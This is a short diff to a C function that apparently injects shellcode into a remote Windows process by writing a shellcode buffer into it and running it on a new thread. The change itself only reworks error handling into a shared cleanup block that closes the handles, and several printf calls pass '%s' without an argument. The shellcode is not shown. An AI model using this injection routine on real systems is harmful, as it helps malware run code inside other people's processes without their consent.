@@ -71,7 +71,7 @@ int shellExec(DWORD process_id){
 
     if(rBuffer == NULL){
         printf("enable to allocate memory... error code : %ld", GetLastError());
-        return EXIT_FAILURE;
+        goto CLEANUP;
     }
 
     WriteProcessMemory(hProcess, rBuffer, shellcode_x64, sizeShellCode, NULL);
@@ -84,16 +84,26 @@ int shellExec(DWORD process_id){
 
     if(hThread == NULL){
         printf("unable to get handle to new thread with error : %ld", GetLastError());
-        return EXIT_FAILURE;
+        goto CLEANUP;
     }
 
     printf("%s waiting for thread to finish executing\n");
     WaitForSingleObject(hThread, INFINITE);
     printf("%s thread finished executing, cleaning up\n");
+    goto CLEANUP;
 
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
+CLEANUP:
+
+	if (hThread) {
+		printf("closing handle to thread\n");
+		CloseHandle(hThread);
+	}
+
+	if (hProcess) {
+		printf("closing handle to process\n");
+		CloseHandle(hProcess);
+	}
+
     printf("%s operation successfully made>>>>");
-
     return EXIT_SUCCESS;
 }
